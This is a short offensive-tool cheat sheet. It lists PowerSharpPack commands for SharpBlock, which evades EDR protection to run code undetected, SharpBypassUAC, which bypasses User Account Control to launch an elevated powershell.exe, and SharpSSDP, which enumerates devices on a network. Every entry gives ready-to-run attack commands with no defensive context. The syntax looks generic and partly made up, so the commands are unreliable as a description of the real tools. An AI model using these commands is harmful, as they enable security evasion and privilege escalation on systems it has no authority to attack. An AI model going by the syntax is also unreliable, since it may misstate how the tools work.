
**SharpBlock**  
Bypasses EDR's active protection DLLs by preventing entry point execution, allowing for undetected code execution.  
@Credit to: https://github.com/CCob/SharpBlock  
```bash
PowerSharpPack -SharpBlock -Command "bypass /method:EDRBlock"
PowerSharpPack -SharpBlock -Command "run /command:powershell.exe"
```

**SharpBypassUAC**  
Bypasses User Account Control (UAC) to execute commands with elevated privileges.  
@Credit to: https://github.com/FatRodzianko/SharpBypassUAC  
```bash
PowerSharpPack -SharpBypassUAC -Command "bypass /method:Token"
PowerSharpPack -SharpBypassUAC -Command "execute /command:powershell.exe"
```

**SharpSSDP**  
SSDP Service Discovery tool for enumerating devices on the network.  
@Credit to: https://github.com/rvrsh3ll/SharpSSDP  
```bash
PowerSharpPack -SharpSSDP -Command "scan"
PowerSharpPack -SharpSSDP -Command "discover"
```
